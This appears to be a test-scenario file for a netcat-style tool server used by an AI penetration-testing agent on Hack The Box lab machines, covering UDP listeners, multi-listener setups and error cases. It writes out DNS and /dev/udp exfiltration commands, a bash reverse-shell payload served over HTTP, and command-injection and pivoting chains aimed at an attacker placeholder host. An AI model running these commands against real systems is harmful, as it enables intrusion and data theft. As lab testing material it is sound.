+#                         UDP SCENARIOS (20-23)
+# ###############################################################################
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 20: UDP Packet Capture (DNS Exfiltration)
+# Goal: Capture data exfiltrated via DNS lookups
+# Methods: udp_listen, udp_packets, stop
+# Suitable: Boxes with blind SSRF or command injection where outbound TCP is blocked
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start UDP listener on port 53
+Method: udp_listen
+Args: {port: 53}
+Expected: success=true, listener_id returned, status="listening"
+Notes: Requires privileged port. Container runs with NET_ADMIN capability.
+
+## Step 2: Trigger DNS exfiltration from target (via other tool)
+Notes: Inject command on target: `nslookup $(cat /etc/hostname).exfil.<LHOST> <LHOST>`
+  Or: `dig @<LHOST> $(whoami).data.exfil`
+  The DNS query will arrive as a UDP packet on port 53.
+
+## Step 3: Check captured packets
+Method: udp_packets
+Args: {listener_id: <from step 1>}
+Expected: success=true, packet_count >= 1, packets array contains captured DNS data
+Notes: Each packet has: timestamp, source_ip, source_port, data (UTF-8), data_hex.
+  DNS queries arrive as binary (data_hex is more useful). Parse the data_hex for
+  the queried domain name which contains the exfiltrated data.
+
+## Step 4: Clean up
+Method: stop
+Args: {id: <listener_id>}
+Expected: success=true, type="udp", total_packets shows count, packets contains data
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 21: UDP Send (Response/Interaction)
+# Goal: Send UDP packets to a remote service
+# Methods: udp_send
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Send UDP packet to target
+Method: udp_send
+Args: {host: <TARGET>, port: 161, data: "SNMP probe"}
+Expected: success=true, bytes_sent > 0
+Notes: UDP is fire-and-forget -- success=true means the packet was sent, not that
+  it was received. No response is captured by udp_send itself. Combine with
+  udp_listen to capture responses on a known port.
+
+## Step 2: Send to DNS port
+Method: udp_send
+Args: {host: <TARGET>, port: 53, data: "\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"}
+Expected: success=true, bytes_sent > 0
+Notes: Sending a raw DNS query. The string encoding may mangle binary data.
+  For reliable binary UDP, use exploit-runner.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 22: UDP Listen and Respond
+# Goal: Combined UDP capture and response
+# Methods: udp_listen, udp_packets, udp_send, stop
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start UDP listener
+Method: udp_listen
+Args: {port: 5353}
+Expected: success=true, listener_id returned
+
+## Step 2: Wait for packets (from target or test)
+Notes: Send test packets to verify: `echo "test" | nc -u <LHOST> 5353` from another tool.
+
+## Step 3: Check captured packets
+Method: udp_packets
+Args: {listener_id: <from step 1>}
+Expected: packet_count >= 1, packets[0] contains source_ip, source_port, data
+
+## Step 4: Send response to the source
+Method: udp_send
+Args: {host: <source_ip from packet>, port: <source_port from packet>, data: "ACK"}
+Expected: success=true
+Notes: UDP is connectionless, so we send to the address/port from the captured packet.
+
+## Step 5: Check for more packets (with clear)
+Method: udp_packets
+Args: {listener_id: <from step 1>, clear: true}
+Expected: success=true (returns current packets, then clears buffer)
+Notes: After clear, subsequent udp_packets returns packet_count=0.
+
+## Step 6: Stop
+Method: stop
+Args: {id: <listener_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 23: UDP on Non-Privileged Port
+# Goal: UDP capture on high port (no root needed)
+# Methods: udp_listen, udp_packets, stop
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start UDP listener on high port
+Method: udp_listen
+Args: {port: 9999}
+Expected: success=true, listener_id returned
+Notes: Ports > 1024 don't require NET_ADMIN. Useful when target can only reach
+  specific ports (e.g., firewall rules allow UDP to 9999 but not 53).
+
+## Step 2: Trigger data from target to this port
+Notes: Inject: `echo $(cat /etc/hostname) > /dev/udp/<LHOST>/9999`
+
+## Step 3: Check packets
+Method: udp_packets
+Args: {listener_id: <from step 1>}
+Expected: packet_count >= 1
+
+## Step 4: Stop
+Method: stop
+Args: {id: <listener_id>}
+
+# ###############################################################################
+#                    MULTI-LISTENER MANAGEMENT (24-25)
+# ###############################################################################
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 24: Multi-Listener Orchestration
+# Goal: Run multiple listeners simultaneously for complex exploitation chains
+# Methods: http_listen, listen, udp_listen, list, stop
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Start HTTP server for payload hosting
+Method: http_listen
+Args: {port: 8080, files: {"/shell.sh": "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"}}
+Expected: success=true, server_id returned
+
+## Step 2: Start TCP listener for reverse shell
+Method: listen
+Args: {port: 4444, timeout: 0}
+Expected: success=true, listener_id returned
+
+## Step 3: Start UDP listener for DNS exfil
+Method: udp_listen
+Args: {port: 5353}
+Expected: success=true, listener_id returned
+
+## Step 4: List all active listeners
+Method: list
+Args: {}
+Expected: success=true, total=3, listeners contains:
+  - {type: "tcp", port: 4444, status: "listening"}
+  - {type: "http", port: 8080, files: ["/shell.sh"]}
+  - {type: "udp", port: 5353, packet_count: 0}
+Notes: list returns all three types. Each entry has id, type, port, created_at.
+  HTTP entries also have tls, files, request_count.
+  TCP entries have status (listening/connected) and remote if connected.
+  UDP entries have packet_count.
+
+## Step 5: Trigger exploitation chain
+Notes:
+  1. Target downloads shell.sh from HTTP server (port 8080)
+  2. Target executes shell.sh -> reverse shell to TCP listener (port 4444)
+  3. Through reverse shell, exfiltrate data via DNS to UDP listener (port 5353)
+
+## Step 6: Verify all received data
+Method: list
+Args: {}
+Expected: total=3, TCP listener status="connected", HTTP request_count >= 1, UDP packet_count >= 1
+Notes: Single list call shows the state of everything. Use this instead of
+  calling listener_status + http_requests + udp_packets separately.
+
+## Step 7: Clean up all (order matters)
+Method: stop
+Args: {id: <tcp_listener_id>}
+Expected: success=true, type="tcp", buffered_data contains shell session
+Method: stop
+Args: {id: <http_server_id>}
+Expected: success=true, type="http", total_requests shows download count
+Method: stop
+Args: {id: <udp_listener_id>}
+Expected: success=true, type="udp", total_packets shows captured DNS queries
+Notes: Stop TCP first to gracefully close shell. HTTP and UDP order doesn't matter.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 25: Empty Listener List
+# Goal: Verify list works with no active listeners
+# Methods: list
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: List when nothing is running
+Method: list
+Args: {}
+Expected: success=true, total=0, listeners=[]
+Notes: Baseline state. Should not error. Useful for agent to verify clean state
+  before starting new listeners.
+
+# ###############################################################################
+#                    NETWORK INTERFACE SCENARIOS (26)
+# ###############################################################################
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SCENARIO 26: Network Interface Discovery
+# Goal: Identify all available network interfaces for LHOST selection
+# Methods: get_interfaces
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Step 1: Get all interfaces
+Method: get_interfaces
+Args: {}
+Expected: success=true, interfaces is array containing objects with interface name
+  and addresses array. Expect at least:
+  - eth0: 172.x.x.x (Docker bridge network)
+  - tun0: 10.10.x.x (HTB VPN, only present when VPN is connected)
+Notes: The agent should always prefer tun0 for LHOST because eth0 is the Docker
+  internal network (not routable from target). If tun0 is absent, VPN is not
+  connected and reverse shells/callbacks will not work.
+  Additional interfaces may appear: br-*, veth* (Docker), wlan0 (if wireless).
+
+# ###############################################################################
+#                        ERROR SCENARIOS (E1-E12)
+# ###############################################################################
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E1: Port Conflict (TCP)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Start first listener
+Method: listen
+Args: {port: 4444, timeout: 0}
+Expected: success=true (first listener)
+
+## Start second listener on same port
+Method: listen
+Args: {port: 4444, timeout: 0}
+Expected: success=false, error contains "already in use"
+Notes: OS rejects bind. Error message should clearly indicate the port number.
+  Agent should check list() before starting a new listener on a possibly-used port.
+
+## Clean up
+Method: stop
+Args: {id: <first_listener_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E2: Port Conflict (HTTP)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Start HTTP server
+Method: http_listen
+Args: {port: 8080, files: {"/test": "OK"}}
+Expected: success=true
+
+## Start second HTTP server on same port
+Method: http_listen
+Args: {port: 8080, files: {"/other": "also OK"}}
+Expected: success=false, error contains "already in use"
+
+## Clean up
+Method: stop
+Args: {id: <first_server_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E3: Port Conflict (UDP)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Start UDP listener
+Method: udp_listen
+Args: {port: 5353}
+Expected: success=true
+
+## Start second UDP listener on same port
+Method: udp_listen
+Args: {port: 5353}
+Expected: success=false, error contains "already in use"
+
+## Clean up
+Method: stop
+Args: {id: <first_listener_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E4: Read from Listener with No Connection
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Start listener but don't connect
+Method: listen
+Args: {port: 4445, timeout: 0}
+Expected: success=true
+
+## Try to read
+Method: listener_read
+Args: {listener_id: <from above>, timeout: 1}
+Expected: success=false, error contains "No active connection"
+Notes: status is "listening" not "connected". Read requires a connected client.
+
+## Clean up
+Method: stop
+Args: {id: <listener_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E5: Write to Listener with No Connection
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Start listener but don't connect
+Method: listen
+Args: {port: 4446, timeout: 0}
+Expected: success=true
+
+## Try to write
+Method: listener_write
+Args: {listener_id: <from above>, data: "test\n"}
+Expected: success=false, error contains "No active connection"
+Notes: Same as E4 but for write. Both read and write require connected status.
+
+## Clean up
+Method: stop
+Args: {id: <listener_id>}
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E6: Read from Disconnected Shell (remote closed)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Setup: Establish reverse shell, then remote exits
+Notes: After shell is connected, send "exit\n" via listener_write.
+
+## Read after exit
+Method: listener_read
+Args: {listener_id: <listener_id>, timeout: 5}
+Expected: success=false, error contains "Connection closed by remote"
+Notes: Status transitions to "closed" after remote disconnect. Subsequent reads
+  should also fail. The agent should recognize this means the shell died and
+  either re-exploit or try a different approach.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E7: Connect to Unreachable Target
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Connect to TEST-NET address (RFC 5737, always unreachable)
+Method: connect
+Args: {host: "192.0.2.1", port: 80, timeout: 2}
+Expected: success=false, error contains "timeout"
+Notes: 192.0.2.0/24 (TEST-NET-1) is non-routable. Tests the timeout error path.
+  Agent should distinguish timeout (filtered/unreachable) from connection refused (closed).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E8: Connect to Closed Port
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Connect to localhost port 1 (almost never open)
+Method: connect
+Args: {host: "127.0.0.1", port: 1, timeout: 2}
+Expected: success=false, error contains "Connection refused"
+Notes: Port 1 (tcpmux) is virtually never running. Tests connection refused path.
+  The error is immediate (no timeout wait).
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E9: Invalid Listener ID
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Check status of non-existent listener
+Method: listener_status
+Args: {listener_id: "tcp_nonexistent12"}
+Expected: success=false, error contains "not found"
+
+## Read from non-existent listener
+Method: listener_read
+Args: {listener_id: "tcp_nonexistent12", timeout: 1}
+Expected: success=false, error contains "not found"
+
+## Write to non-existent listener
+Method: listener_write
+Args: {listener_id: "tcp_nonexistent12", data: "test\n"}
+Expected: success=false, error contains "not found"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E10: Invalid Server/Listener IDs for Other Types
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## HTTP requests with non-existent server
+Method: http_requests
+Args: {server_id: "http_nonexistent12"}
+Expected: success=false, error contains "not found"
+
+## HTTP file update with non-existent server
+Method: http_file
+Args: {server_id: "http_nonexistent12", path: "/test", content: "data"}
+Expected: success=false, error contains "not found"
+
+## UDP packets with non-existent listener
+Method: udp_packets
+Args: {listener_id: "udp_nonexistent12"}
+Expected: success=false, error contains "not found"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E11: Stop Non-Existent Listener
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Stop with invalid ID
+Method: stop
+Args: {id: "tcp_nonexistent12"}
+Expected: success=false, error contains "not found"
+
+## Stop with HTTP-prefixed invalid ID
+Method: stop
+Args: {id: "http_nonexistent12"}
+Expected: success=false, error contains "not found"
+
+## Stop with UDP-prefixed invalid ID
+Method: stop
+Args: {id: "udp_nonexistent12"}
+Expected: success=false, error contains "not found"
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# E12: Invalid Port Ranges
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## TCP listen on port 0
+Method: listen
+Args: {port: 0, timeout: 0}
+Expected: success=false, error contains "Invalid port"
+
+## TCP listen on port 99999
+Method: listen
+Args: {port: 99999, timeout: 0}
+Expected: success=false, error contains "Invalid port"
+
+## HTTP listen on port -1
+Method: http_listen
+Args: {port: -1, files: {}}
+Expected: success=false, error contains "Invalid port"
+
+## UDP listen on port 70000
+Method: udp_listen
+Args: {port: 70000}
+Expected: success=false, error contains "Invalid port"
+
+## check_port with invalid port (still succeeds but tests validation)
+Method: check_port
+Args: {host: "127.0.0.1", port: 0, timeout: 1}
+Expected: success=false (OS error or validation error)
+
+# ###############################################################################
+#                    CROSS-TOOL PATTERNS (P1-P3)
+# ###############################################################################
+# These document common netcat usage patterns with other MCP tools.
+# Not standalone scenarios -- reference for agent behavior.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# P1: netcat + curl (Command Injection RCE)
+# ═══════════════════════════════════════════════════════════════════════════════
+# Pattern:
+#   1. get_interfaces -> LHOST
+#   2. listen(port=4444, timeout=0) -> listener_id
+#   3. curl: inject `bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'` via vulnerable param
+#   4. listener_status(listener_id) -> poll until connected
+#   5. listener_write/read cycle for shell interaction
+#   6. stop(listener_id)
+# Notes: Most common exploitation pattern. Curl handles the injection vector,
+#   netcat catches the callback. Non-blocking listen is essential so the agent
+#   can make the curl call while the listener is waiting.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# P2: netcat + exploit-runner (Custom Exploit Delivery)
+# ═══════════════════════════════════════════════════════════════════════════════
+# Pattern:
+#   1. get_interfaces -> LHOST
+#   2. http_listen(port=8080, files={"/payload": exploit_content})
+#   3. listen(port=4444, timeout=0)
+#   4. exploit-runner: execute exploit script that references LHOST:8080 and LHOST:4444
+#   5. http_requests -> verify exploit downloaded payload
+#   6. listener_status -> verify reverse shell connected
+#   7. Shell interaction via listener_write/read
+#   8. stop both
+# Notes: Three-phase: serve payload, catch shell, interact. All netcat listeners
+#   must be started BEFORE the exploit-runner call.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# P3: netcat + ssh (Pivot Listener)
+# ═══════════════════════════════════════════════════════════════════════════════
+# Pattern:
+#   1. SSH into compromised host A
+#   2. listen(port=5555, timeout=0) on attacker (netcat container)
+#   3. Via SSH exec on host A: trigger reverse shell from host B to attacker:5555
+#   4. listener_status -> verify connection from host B
+#   5. Shell interaction with host B via listener_write/read
+# Notes: The reverse shell comes from a different host than the SSH session.
+#   The netcat listener port must be reachable from the pivot network.
